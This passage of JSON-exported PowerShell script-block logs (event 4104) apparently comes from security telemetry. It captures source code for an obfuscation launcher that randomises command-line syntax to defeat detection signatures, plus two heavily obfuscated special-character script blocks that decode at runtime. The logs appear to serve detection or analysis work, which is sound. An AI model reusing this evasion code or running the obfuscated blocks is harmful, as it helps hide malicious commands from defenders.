\"%$VariableName2%\"\n              $CmdSyntax   = $SlashC + ' '*(Get-Random -Minimum 0 -Maximum 4) + '\"' + $SetSyntax + ' '*(Get-Random -Minimum 0 -Maximum 3)+ $ScriptString + ' '*(Get-Random -Minimum 0 -Maximum 3) + '&&' + ' '*(Get-Random -Minimum 0 -Maximum 3) + $SetSyntax2 + $Echo + ' '*(Get-Random -Minimum 1 -Maximum 3) + $InvokeOption + ' '*(Get-Random -Minimum 0 -Maximum 3) + '^|' + ' '*(Get-Random -Minimum 0 -Maximum 3) + $PathToPowerShell + $PSCmdSyntax + '&&' + ' '*(Get-Random -Minimum 0 -Maximum 3) + $PathToCmd + $CmdSyntax2 + '\"'\n    \n              # Set argument info for process tree output after this Switch block.\n              $ArgsDefenderWillSee += , @($PathToCmd       , $CmdSyntax)\n              $ArgsDefenderWillSee += , @($PathToCmd       , $CmdSyntax2)\n              $ArgsDefenderWillSee += , @($PathToPowerShell, $PSCmdSyntax.Replace('^',''))\n\n              $CmdLineOutput = $PathToCmd + $CmdSyntax\n          }\n        10 {\n              ############\n              ## CLIP++ ##\n              ############\n\n              # Switch cmd.exe escape with powershell.exe escape of double-quote.\n              If($ScriptString.Contains('\\\"')) {$ScriptString = $ScriptString.Replace('\\\"','\"')}\n             \n              # Choose random syntax for invoking powershell.exe's StdIn.\n              $PowerShellClip = Out-RandomClipboardInvokeSyntax\n\n              # Since we're embedding $PowerShellClip syntax one more process deep we need to double-escape & < > and | characters for cmd.exe.\n              ForEach($Char in @('<','>','|','&'))\n              {\n                  # Remove single escaping and then escape all characters. This will handle single-escaped and not-escaped characters.\n                  If($PowerShellClip.Contains(\"^$Char\")) \n                  {\n                      $PowerShellClip = $PowerShellClip.Replace(\"^$Char\",\"^^^$Char\")\n                  }\n              }\n\n              # If this launcher is run in PowerShell 2.0 then Single-Threaded Apartment must be specified with -st or -sta.\n              # Otherwise you will get the following error: \"Current thread must be set to single thread apartment (STA) mode before OLE calls can be made.\"\n              # Since Invoke-Obfuscation output is designed to run on any PowerShell version then for this launcher we will add the -st/-sta flag to $PowerShellFlags.\n              \n              # If selected then the -Command flag needs to remain last (where it currently is).\n              $CommandFlagValue = $NULL\n              If($PSBoundParameters['Command'] -OR $Command)\n              {\n                  $UpperLimit = $PowerShellFlagsArray.Count-1\n                  $CommandFlagValue = $PowerShellFlagsArray[$PowerShellFlagsArray.Count-1]\n              }\n              Else\n              {\n                  $UpperLimit = $PowerShellFlagsArray.Count\n              }\n\n              # Re-extract PowerShellFlags so we can add in -st/-sta and then reorder (maintaining command flag at the end if present).\n              $PowerShellFlags = @()\n              For($i=0; $i -lt $UpperLimit; $i++)\n              {\n                  $PowerShellFlags += $PowerShellFlagsArray[$i]\n              }\n\n              # Add in -st/-sta to PowerShellFlags.\n              $PowerShellFlags += (Get-Random -Input @('-st','-sta'))\n              \n              # Randomize the order of the command-line arguments.\n              # This is to prevent the Blue Team from placing false hope in simple signatures for consistent ordering of these arguments.\n              If($PowerShellFlags.Count -gt 1)\n              {\n                  $PowerShellFlags = Get-Random -InputObject $PowerShellFlags -Count $PowerShellFlags.Count\n              }\n\n              # If selected then the -Command flag needs to be added last.\n              If($CommandFlagValue)\n              {\n                  $PowerShellFlags += $CommandFlagValue\n              }\n\n              # Randomize the case of all command-line arguments.\n              For($i=0; $i -lt $PowerShellFlags.Count; $i++)\n              {\n                  $PowerShellFlags[$i] = ([Char[]]$PowerShellFlags[$i] | ForEach-Object {$Char = $_.ToString().ToLower(); If(Get-Random -Input @(0..1)) {$Char = $Char.ToUpper()} $Char}) -Join ''\n              }\n\n              # Insert random-length whitespace between all command-line arguments.\n              $PowerShellFlags = ($PowerShellFlags | ForEach-Object {$_ + ' '*(Get-Random -Minimum 1 -Maximum 3)}) -Join ''\n              $PowerShellFlags = ' '*(Get-Random -Minimum 1 -Maximum 3) + $PowerShellFlags + ' '*(Get-Random -Minimum 1 -Maximum 3)\n\n              # Build out command line syntax in reverse so we can display the process argument tree at the end of this Switch block.\n              $PSCmdSyntax = $PowerShellFlags + $PowerShellClip\n              $CmdSyntax2  = $SlashC + ' '*(Get-Random -Minimum 0 -Maximum 4) + $PathToPowerShell + $PsCmdSyntax\n              $CmdSyntax   = $SlashC + ' '*(Get-Random -Minimum 0 -Maximum 4) + '\"'  + ' '*(Get-Random -Minimum 0 -Maximum 3) + $Echo + (Get-Random -Input ('/','\\',' '*(Get-Random -Minimum 1 -Maximum 3))) + $ScriptString +",
                    "ScriptBlockId": "b4052652-9f0d-4423-aa08-576b81f153d0"
                }
            }
        },
        {
            "@timestamp": "2025-03-27T15:07:36.976Z",
            "event": {
                "code": "4104",
                "kind": "event",
                "provider": "Microsoft-Windows-PowerShell"
            },
            "winlog": {
                "event_data": {
                    "MessageNumber": "1",
                    "MessageTotal": "1",
                    "ScriptBlockText": "{${       }  =  \"\".(\"$(@{})\"[\"${           }\"+\"${    }\"]+\"$(@{  })  \"[\"${           }\"+\"${   }\"]+  \"$(  @{  }  )  \"[  ${     }  ]+\"$(@{  })\"[${    }]+  \"$?\"[${           }]+  \"$(@{}  )  \"[  ${      }  ]  )  }",
                    "ScriptBlockId": "03d640ac-c230-4a69-8a59-f841565e8767"
                }
            }
        },
        {
            "@timestamp": "2025-03-27T15:05:19.459Z",
            "event": {
                "code": "4104",
                "kind": "event",
                "provider": "Microsoft-Windows-PowerShell"
            },
            "winlog": {
                "event_data": {
                    "MessageNumber": "3",
                    "MessageTotal": "4",
                    "ScriptBlockText": "${       }${     }${      }${           }  +  ${       }${     }${     }${  }  +${       }${    }${ }  +${       }${          }${        }+${       }${     }${     }${      }  +${       }${     }${     }${         }  +  ${       }${     }${     }${     }  +${       }${     }${      }${          }  +  ${       }${     }${      }${     }  +  ${       }${    }${      }  +${       }${        }${ }  +  ${       }${     }${     }${      }+${       }${     }${     }${          }  +  ${       }${     }${      }${         }  +${       }${     }${      }${         }+${       }${    }${    }  +${       }${        }${  }+${       }${ }${    }+  ${       }${    }${      }+${       }${        }${ }+${       }${         }${      }+${       }${     }${     }${    }+  ${       }${     }${     }${     }  +  ${       }${           }${           }  +${       }${     }${      }${     }  +  ${       }${     }${     }${   }+${       }${     }${     }${   }+  ${       }${          }${  }  +  ${       }${           }${          }+  ${       }${     }${     }${      }+  ${       }${     }${      }${      }  +  ${       }${     }${      }${         }  +  ${       }${     }${      }${     }+${       }${    }${    }  +${       }${     }${        }  +  ${       }${     }${      }+  ${       }${        }${  }  +${       }${        }${  }+  ${       }${        }${  }+${       }${        }${  }  +  ${       }${        }${  }+${       }${        }${  }  +${       }${        }${  }+  ${       }${        }${  }  +${       }${        }${  }+${       }${        }${  }  +  ${       }${        }${  }  +  ${       }${        }${  }  +  ${       }${        }${  }  +${       }${        }${  }  +${       }${        }${  }  +  ${       }${        }${  }  +  ${       }${        }${  }+  ${       }${        }${  }+  ${       }${        }${  }  +${       }${        }${  }+  ${       }${        }${  }  +${       }${        }${  }+  ${       }${        }${  }+${       }${        }${  }  +${       }${        }${  }  +${       }${        }${  }+  ${       }${        }${  }+  ${       }${        }${  }+  ${       }${        }${  }+  ${       }${        }${  }+  ${       }${        }${  }  +  ${       }${        }${  }  +${       }${        }${  }  +  ${       }${        }${  }  +${       }${        }${  }  +  ${       }${        }${  }+${       }${        }${  }  +  ${       }${        }${  }+  ${       }${        }${  }  +${       }${        }${  }+${       }${        }${  }+${       }${        }${  }+  ${       }${        }${  }+  ${       }${        }${  }+  ${       }${        }${  }  +${       }${        }${ }+${       }${         }${      }+${       }${     }${     }${    }+  ${       }${     }${     }${     }  +  ${       }${           }${           }+  ${       }${     }${      }${     }  +  ${       }${     }${     }${   }+  ${       }${     }${     }${   }+  ${       }${          }${        }+  ${       }${     }${      }${      }+${       }${    }${    }+  ${       }${     }${        }+${       }${     }${      }  +  ${       }${        }${  }  +  ${       }${        }${  }  +  ${       }${        }${  }+  ${       }${        }${  }+  ${       }${        }${  }  +  ${       }${        }${  }+  ${       }${        }${  }  +  ${       }${        }${  }+  ${       }${        }${  }  +${       }${        }${  }+  ${       }${        }${  }  +${       }${        }${  }+${       }${        }${  }  +${       }${        }${  }+  ${       }${        }${  }  +  ${       }${        }${  }  +${       }${        }${  }  +  ${       }${        }${  }+${       }${        }${  }  +${       }${        }${  }+  ${       }${        }${  }  +${       }${        }${  }+  ${       }${        }${  }+${       }${        }${  }  +${       }${        }${  }+  ${       }${        }${  }+${       }${        }${  }+${       }${        }${  }+${       }${        }${  }+${       }${        }${  }+${       }${        }${  }  +  ${       }${        }${  }+  ${       }${        }${  }  +  ${       }${        }${  }+  ${       }${        }${  }+${       }${        }${  }  +  ${       }${        }${  }+${       }${        }${  }  +${       }${        }${  }  +  ${       }${        }${  }+  ${       }${        }${  }+${       }${        }${  }+  ${       }${        }${  }+  ${       }${        }${  }+${       }${        }${  }+  ${       }${        }${ }  +${       }${          }${      }  +${       }${     }${      }${   }+${       }${     }${      }${         }  +  ${       }${     }${      }${     }+  ${       }${         }${        }+${       }${     }${     }${ }  +  ${       }${     }${     }${    }  +${       }${     }${      }${     }  +  ${       }${           }${          }+${       }${     }${      }${           }  +  ${       }${    }${ }  +${       }${         }${        }+${       }${           }${          }  +  ${       }${     }${      }${  }+${       }${     }${      }${     }+${       }${          }${      }  +${       }${     }${      }${   }  +${       }${     }${      }${         }+${       }${     }${      }${     }+  ${       }${          }${  }+  ${       }${           }${          }  +  ${       }${     }${     }${      }+  ${       }${     }${      }${      }  +  ${       }${     }${      }${         }  +${       }${     }${      }${     }  +  ${       }${    }${    }  +  ${       }${     }${        }  +${       }${     }${      }+${       }${        }${  }  +  ${       }${        }${  }+  ${       }${        }${  }+${       }${        }${  }  +  ${       }${        }${  }+${       }${        }${  }+  ${       }${        }${  }  +${       }${        }${  }+  ${       }${        }${  }+${       }${        }${  }  +  ${       }${        }${  }  +${       }${        }${  }  +  ${       }${        }${  }+${       }${        }${  }  +  ${       }${        }${  }+  ${       }${        }${  }+  ${       }${        }${  }  +${       }${        }${  }+${       }${        }${  }  +${       }${        }${  }  +${       }${        }${  }  +${       }${        }${  }+  ${       }${        }${  }  +${       }${        }${  }+  ${       }${        }${  }+${       }${        }${  }  +  ${       }${        }${  }+  ${       }${        }${  }  +${       }${        }${  }  +${       }${        }${  }+${       }${        }${  }+${       }${        }${  }+  ${       }${        }${  }  +  ${       }${        }${  }+${       }${        }${  }+  ${       }${        }${  }  +  ${       }${        }${  }  +  ${       }${        }${  }+  ${       }${        }${  }  +${       }${        }${  }  +${       }${        }${  }+  ${       }${        }${  }  +  ${       }${        }${  }  +${       }${        }${  }  +  ${       }${        }${  }+  ${       }${        }${ }  +  ${       }${          }${          }+  ${       }${     }${      }${   }+${       }${     }${     }${      }  +  ${       }${     }${      }${   }  +  ${       }${ }${         }  +  ${       }${     }${     }${          }+${       }${     }${      }${           }+${       }${     }${     }${  }+  ${       }${         }${          }+${       }${     }${      }${   }+  ${       }${     }${     }${ }  +  ${       }${     }${      }${    }+  ${       }${          }${      }+  ${       }${     }${     }${          }  +  ${       }${     }${      }${         }  +${       }${     }${      }${         }  +  ${       }${          }${          }  +  ${       }${     }${      }${     }  +  ${       }${     }${      }${           }  +  ${       }${     }${     }${     }  +${       }${     }${     }${    }+  ${       }${     }${  }${     }+${       }${    }${    }  +${       }${     }${        }  +${       }${     }${      }+  ${       }${        }${  }+  ${       }${        }${  }  +  ${       }${        }${  }  +  ${       }${        }${  }+  ${       }${        }${  }+${       }${        }${  }+${       }${        }${  }  +${       }${        }${  }  +${       }${        }${  }  +  ${       }${        }${  }  +${       }${        }${  }  +  ${       }${        }${  }+  ${       }${        }${  }+  ${       }${        }${  }+${       }${        }${  }  +  ${       }${        }${  }+  ${       }${        }${  }  +  ${       }${        }${  }+${       }${        }${  }  +  ${       }${        }${  }  +  ${       }${        }${  }+${       }${        }${  }  +  ${       }${        }${  }  +  ${       }${        }${  }+${       }${        }${  }  +${       }${        }${  }+${       }${        }${  }  +  ${       }${        }${  }  +  ${       }${        }${  }+  ${       }${        }${  }  +${       }${        }${  }+${       }${        }${  }+${       }${        }${  }+  ${       }${        }${  }+${       }${        }${  }+${       }${        }${  }+  ${       }${        }${  }+  ${       }${        }${  }  +  ${       }${        }${  }  +  ${       }${        }${  }  +  ${       }${        }${  }+  ${       }${        }${  }+  ${       }${        }${  }+  ${       }${        }${  }  +  ${       }${        }${  }+${       }${           }${     }  +  ${       }${          }${        }  +  ${       }${     }${     }${      }+  ${       }${     }${     }${ }+  ${       }${         }${      }  +  ${       }${     }${     }${ }  +${       }${     }${     }${    }+  ${       }${           }${        }+${       }${   }${         }+  ${       }${   }${         }  +${       }${           }${      }+  ${       }${     }${      }${     }+${       }${     }${     }${    }+${       }${     }${     }${     }  +  ${       }${    }${    }+  ${       }${     }${        }+${       }${     }${      }  +${       }${        }${  }+  ${       }${        }${  }  +${       }${        }${  }  +  ${       }${        }${  }+${       }${        }${  }  +  ${       }${        }${  }  +  ${       }${        }${  }  +${       }${        }${  }+${       }${        }${  }  +  ${       }${        }${  }  +  ${       }${        }${  }+  ${       }${        }${  }  +${       }${        }${  }+${       }${        }${  }+${       }${        }${  }  +  ${       }${        }${  }  +  ${       }${        }${  }  +  ${       }${        }${  }+${       }${        }${  }+${       }${        }${  }+${       }${        }${  }  +${       }${        }${  }  +  ${       }${        }${  }+${       }${        }${  }  +  ${       }${        }${  }  +${       }${        }${  }+${       }${        }${  }  +${       }${        }${  }  +${       }${        }${  }+${       }${        }${  }  +${       }${        }${  }+  ${       }${        }${  }+${       }${        }${  }  +  ${       }${        }${  }+${       }${        }${  }+${       }${        }${  }+${       }${        }${  }+  ${       }${        }${  }  +${       }${        }${  }+  ${       }${        }${  }+  ${       }${        }${  }+${       }${        }${  }+  ${       }${        }${  }  +  ${       }${        }${  }+  ${       }${        }${  }+${       }${           }${     }  +  ${       }${          }${        }  +  ${       }${     }${     }${      }+  ${       }${     }${     }${ }  +${       }${         }${      }+  ${       }${     }${     }${ }  +${       }${     }${     }${    }+  ${       }${           }${        }  +${       }${   }${         }  +${       }${   }${         }+${       }${           }${      }  +${       }${     }${      }${     }+${       }${     }${     }${    }+  ${       }${     }${     }${     }+  ${       }${    }${    }+  ${       }${     }${        }  +  ${       }${     }${      }  +  ${       }${        }${  }  +  ${       }${        }${  }  +  ${       }${        }${  }  +${       }${        }${  }  +${       }${        }${  }+  ${       }${        }${  }  +  ${       }${        }${  }  +  ${       }${        }${  }  +  ${       }${        }${  }+${       }${        }${  }  +${       }${        }${  }  +  ${       }${        }${  }+  ${       }${        }${  }+  ${       }${        }${  }  +  ${       }${        }${  }  +  ${       }${        }${  }  +${       }${        }${  }  +${       }${        }${  }  +  ${       }${        }${  }+${       }${        }${  }+${       }${        }${  }  +${       }${        }${  }  +  ${       }${        }${  }+  ${       }${        }${  }+${       }${        }${  }+${       }${        }${  }+  ${       }${        }${  }+  ${       }${        }${  }+  ${       }${        }${  }  +${       }${        }${  }  +${       }${        }${  }+${       }${        }${  }+${       }${        }${  }+  ${       }${        }${  }  +${       }${        }${  }  +  ${       }${        }${  }+${       }${        }${  }  +  ${       }${        }${  }  +  ${       }${        }${  }+  ${       }${        }${  }  +  ${       }${        }${  }+${       }${        }${  }  +  ${       }${        }${  }+${       }${        }${  }+${       }${",
                    "ScriptBlockId": "875951c8-e90a-44fd-ba28-142ee52fa296"
                }
            }
        }
    ]
}
